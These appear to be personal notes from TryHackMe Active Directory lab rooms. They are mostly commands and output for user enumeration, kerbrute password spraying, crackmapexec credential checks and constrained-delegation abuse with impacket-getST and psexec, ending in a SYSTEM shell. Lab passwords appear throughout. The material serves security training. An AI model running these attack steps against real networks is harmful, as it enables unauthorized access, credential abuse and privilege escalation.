```
Domain Name: THM-AD
Domain Sid: S-1-5-21-3591857110-2884097990-301047963
[I] Found new SID:
S-1-5-21-3591857110-2884097990-301047963
[I] Found new SID:
S-1-5-21-3591857110-2884097990-301047963
[+] Enumerating users using SID S-1-5-21-3591857110-2884097990-301047963 and logon username '', password ''                                                           
S-1-5-21-3591857110-2884097990-301047963-500 THM-AD\Administrator (Local User)
S-1-5-21-3591857110-2884097990-301047963-501 THM-AD\Guest (Local User)
S-1-5-21-3591857110-2884097990-301047963-502 THM-AD\krbtgt (Local User)
S-1-5-21-3591857110-2884097990-301047963-512 THM-AD\Domain Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-513 THM-AD\Domain Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-514 THM-AD\Domain Guests (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-515 THM-AD\Domain Computers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-516 THM-AD\Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-517 THM-AD\Cert Publishers (Local Group)
S-1-5-21-3591857110-2884097990-301047963-518 THM-AD\Schema Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-519 THM-AD\Enterprise Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-520 THM-AD\Group Policy Creator Owners (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-521 THM-AD\Read-only Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-522 THM-AD\Cloneable Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-525 THM-AD\Protected Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-526 THM-AD\Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-527 THM-AD\Enterprise Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-1000 THM-AD\ATTACKTIVEDIREC$ (Local User)
[+] Enumerating users using SID S-1-5-21-3532885019-1334016158-1514108833 and logon username '', password ''
S-1-5-21-3532885019-1334016158-1514108833-500 ATTACKTIVEDIREC\Administrator (Local User)
S-1-5-21-3532885019-1334016158-1514108833-501 ATTACKTIVEDIREC\Guest (Local User)
S-1-5-21-3532885019-1334016158-1514108833-503 ATTACKTIVEDIREC\DefaultAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-504 ATTACKTIVEDIREC\WDAGUtilityAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-513 ATTACKTIVEDIREC\None (Domain Group)

```

```
~/go/bin/kerbrute userenum --dc 10.10.170.23 -d spookysec.local /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 05/13/25 - Ronnie Flathers @ropnop

2025/05/13 05:42:14 >  Using KDC(s):
2025/05/13 05:42:14 >   10.10.170.23:88

2025/05/13 05:42:15 >  [+] VALID USERNAME:       james@spookysec.local
2025/05/13 05:42:23 >  [+] VALID USERNAME:       James@spookysec.local
2025/05/13 05:42:24 >  [+] VALID USERNAME:       robin@spookysec.local
2025/05/13 05:42:31 >  [+] VALID USERNAME:       darkstar@spookysec.local
2025/05/13 05:42:39 >  [+] VALID USERNAME:       administrator@spookysec.local
2025/05/13 05:42:48 >  [+] VALID USERNAME:       backup@spookysec.local
2025/05/13 05:42:52 >  [+] VALID USERNAME:       paradox@spookysec.local
2025/05/13 05:43:24 >  [+] VALID USERNAME:       JAMES@spookysec.local
2025/05/13 05:43:35 >  [+] VALID USERNAME:       Robin@spookysec.local
2025/05/13 05:44:33 >  [+] VALID USERNAME:       Administrator@spookysec.local
2025/05/13 05:46:22 >  [+] VALID USERNAME:       Darkstar@spookysec.local
2025/05/13 05:46:56 >  [+] VALID USERNAME:       Paradox@spookysec.local
2025/05/13 05:49:20 >  [+] VALID USERNAME:       DARKSTAR@spookysec.local
2025/05/13 05:50:02 >  [+] VALID USERNAME:       ori@spookysec.local

```

---------
https://tryhackme.com/room/persistingad

``` bash
└─$ ssh za.tryhackme.loc\\svcIIS@THMSERVER1.za.tryhackme.loc
passwd: Scores1981
└─$ impacket-smbclient za.tryhackme.loc\svcIIS:'Password1@'@thmwrk1.za.tryhackme.loc -dc-ip 10.200.61.101        
 crackmapexec smb 10.200.61.0/24 -u svcIIS -p 'Password1@'

SMB         10.200.61.100   445    THMROOTDC        [*] Windows 10 / Server 2019 Build 17763 x64 (name:THMROOTDC) (domain:tryhackme.loc) (signing:True) (SMBv1:False)
SMB         10.200.61.100   445    THMROOTDC        [-] tryhackme.loc\svcIIS:Password1@ STATUS_LOGON_FAILURE 
SMB         10.200.61.101   445    THMDC            [*] Windows 10 / Server 2019 Build 17763 x64 (name:THMDC) (domain:za.tryhackme.loc) (signing:True) (SMBv1:False)
SMB         10.200.61.201   445    THMSERVER1       [*] Windows 10 / Server 2019 Build 17763 x64 (name:THMSERVER1) (domain:za.tryhackme.loc) (signing:False) (SMBv1:False)
SMB         10.200.61.101   445    THMDC            [+] za.tryhackme.loc\svcIIS:Password1@ 
SMB         10.200.61.202   445    THMSERVER2       [*] Windows 10 / Server 2019 Build 17763 x64 (name:THMSERVER2) (domain:za.tryhackme.loc) (signing:False) (SMBv1:False)
SMB         10.200.61.248   445    THMWRK1          [*] Windows 10 / Server 2019 Build 17763 x64 (name:THMWRK1) (domain:za.tryhackme.loc) (signing:False) (SMBv1:False)
SMB         10.200.61.201   445    THMSERVER1       [+] za.tryhackme.loc\svcIIS:Password1@ 
SMB         10.200.61.202   445    THMSERVER2       [+] za.tryhackme.loc\svcIIS:Password1@ 
SMB         10.200.61.248   445    THMWRK1          [+] za.tryhackme.loc\svcIIS:Password1@ 

```
svcIIS
- password spray 
```
~/go/bin/kerbrute passwordspray --dc 10.200.61.101 -d za.tryhackme.loc ../exploitingad/users.lst Password1@

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 05/19/25 - Ronnie Flathers @ropnop

2025/05/19 17:51:46 >  Using KDC(s):
2025/05/19 17:51:46 >   10.200.61.101:88

 [+] VALID LOGIN:  AARON.JONES@za.tryhackme.loc:Password1@
 [+] VALID LOGIN:  ABBIE.GREEN@za.tryhackme.loc:Password1@
 [+] VALID LOGIN:  SVCIIS@za.tryhackme.loc:Password1@
 [+] VALID LOGIN:  T1_TREVOR.JONES@za.tryhackme.loc:Password1@
 [+] VALID LOGIN:  T2_ALAN.RILEY@za.tryhackme.loc:Password1@
 [+] VALID LOGIN:  T2_CAROLINE.DAWSON@za.tryhackme.loc:Password1@
 [+] VALID LOGIN:  T2_JUNE.RUSSELL@za.tryhackme.loc:Password1@
2025/05/19 17:56:15 >  [+] VALID LOGIN:  T2_LAWRENCE.LEWIS@za.tryhackme.loc:Password1@
2025/05/19 17:56:15 >  [+] VALID LOGIN:  T2_MELANIE.DAVIES@za.tryhackme.loc:Password1@
2025/05/19 17:56:15 >  [+] VALID LOGIN:  T2_ROSS.BIRD@za.tryhackme.loc:Password1@
2025/05/19 17:56:18 >  [+] VALID LOGIN:  THACKME@za.tryhackme.loc:Password1@
```

```
PS C:\Users\t2_ross.bird\Desktop> Find-WMILocalAdminAccess
SystemDirectory : C:\Windows\system32
Organization    : Vagrant
BuildNumber     : 17763
RegisteredUser  : Vagrant
SerialNumber    : 00429-70000-00000-AA096
Version         : 10.0.17763

The current user has Local Admin access on: THMWRK1.za.tryhackme.loc

```

```
PS C:\Users\t1_trevor.jones> Find-WMILocalAdminAccess 

SystemDirectory : C:\Windows\system32                                   
Organization    : Vagrant                                               
BuildNumber     : 17763                                                 
RegisteredUser  : Vagrant                                               
SerialNumber    : 00429-70000-00000-AA266                               
Version         : 10.0.17763                                            

The current user has Local Admin access on: THMSERVER2.za.tryhackme.loc 
SystemDirectory : C:\Windows\system32 
Organization    : Vagrant                                               
BuildNumber     : 17763                                                 
RegisteredUser  : Vagrant                                               
SerialNumber    : 00429-70000-00000-AA361                               
Version         : 10.0.17763                                            
The current user has Local Admin access on: THMSERVER1.za.tryhackme.loc 

```



##### exploit unconstrained delegation
![[Pasted image 20250520023216.png]]
```
PS C:\Users\trevor.local\Documents> Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
DistinguishedName        : CN=IIS Server,CN=Users,DC=za,DC=tryhackme,DC=loc
Enabled                  : True
GivenName                : IIS
msDS-AllowedToDelegateTo : {WSMAN/THMSERVER1.za.tryhackme.loc, WSMAN/THMSERVER1, http/THMSERVER1.za.tryhackme.loc, http/THMSERVER1}
Name                     : IIS Server
ObjectClass              : user
ObjectGUID               : 11e42287-0a25-4d73-800d-b62e2d2a2a4b
SamAccountName           : svcIIS
SID                      : S-1-5-21-3885271727-2693558621-2658995185-6155
Surname                  : Server
UserPrincipalName        : svcIIS@za.tryhackme.loc

PS C:\Users\trevor.local\Documents> $objSID = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-21-3885271727-2693558621-2658995185-6151")
PS C:\Users\trevor.local\Documents> $objUser = $objSID.Translate([System.Security.Principal.NTAccount])
PS C:\Users\trevor.local\Documents> $objUser.Value
ZA\THMSERVER1$

└─$ impacket-getST -spn 'WSMAN/THMSERVER1.za.tryhackme.loc' -spn 'http/THMSERVER1.za.tryhackme.loc' -impersonate 't1_trevor.jones'  'za.tryhackme.loc/SVCIIS:Password1@'
└─$ export KRB5CCNAME=t1_trevor.jones@http_THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.ccache
└─$ impacket-psexec -k -no-pass za.tryhackme.loc/t1_trevor.jones@THMSERVER1.za.tryhackme.loc
C:\Windows\system32> whoami
nt authority\system
```

